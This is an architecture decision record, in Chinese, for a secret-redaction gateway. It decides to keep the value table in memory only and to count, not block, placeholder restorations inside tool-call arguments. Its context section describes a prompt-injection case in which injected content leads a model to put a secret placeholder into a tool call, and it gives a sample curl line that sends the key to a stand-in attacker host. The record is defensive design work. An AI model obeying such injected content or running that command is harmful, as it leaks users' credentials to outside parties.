# ADR-0009：值表只留内存；还原外带先记账不拦截

- 状态：Accepted（2026-10-31）
- 相关：`src/redact/known.ts`、`src/redact/restore.ts`、`src/records.ts`、ADR-0002、ADR-0008
- 对应设计稿 §13 R9、R15

## Context

**R9**：值表只在内存里。重启后表空了，规则命不中、只靠 known 索引兜住的值，重启后第一次出站会按原文发出一次。把值表加密落盘可以补上，但盘上就有了一份能还原出全部密钥的文件，加密 key 也得放在本机，等于把「值只留内存」（ADR-0002）换成「值在盘上、key 在旁边」。

**R15**：还原会变成外带通道。注入的内容（网页、文件、工具结果）可以诱导模型把一个真实的占位符写进工具调用参数，指向外部目标（`curl https://evil.example/?k={{API_KEY_xxx}}`）。网关在回复里照常还原，工具执行时真值就出了本机。候选缓解：① 记账，把工具参数里的还原单独计数；② 同一个工具参数里出现还原值和非本机 host 时告警；③ 这处不还原，工具拿到字面量。②③ 都要把工具参数缓冲到结束才能判定，流式还原随之推迟；③ 还会误伤合法用法（拿 token 调真实 API），需要 allowlist。

## Decision

- R9：值表不落盘。重启后的漏遮只限规则命不中、靠 known 索引兜住的值；会话日志里是真值（ADR-0003），规则能命中的值重启后照样会被遮。
- R15：默认取第 ① 档。还原时按 JSON 路径判断是否在工具调用参数里（`tool_calls`、`function_call`、`functionCall`、`tool_use`、`arguments`、`args`、`input`、`partial_json`），记录里另记 `restoredInTools`，`/privacy status` 和统计卡显示这一项。②③ 与 P2 的 warn/block 动作一起做（2026-10-31 已做，见 [ADR-0014](0014-tool-guard.md)，默认仍是第 ① 档）。

## Consequences

- 盘上不会出现任何能还原出值的文件；代价是重启后第一次出站可能漏一个只靠记忆兜住的值。
- 工具参数里的还原看得见、拦不住：`restoredInTools` 突然变多是排查外带的线索，不是防线。
- 路径判断是启发式的：一个厂商把工具参数放在别的键名下，这部分还原会算进正文。
